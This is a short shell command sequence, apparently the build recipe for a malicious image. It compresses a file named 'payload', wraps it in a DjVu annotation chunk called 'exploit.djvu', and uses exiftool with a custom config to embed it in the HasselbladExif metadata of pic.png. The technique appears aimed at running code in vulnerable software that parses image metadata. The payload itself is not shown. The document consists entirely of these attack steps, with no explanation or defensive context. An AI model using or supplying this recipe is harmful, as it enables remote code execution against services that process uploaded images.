rm pic.png
mv pic.png_original pic.png
bzz payload payload.bzz
djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz
exiftool -config configfile '-HasselbladExif<=exploit.djvu' pic.png
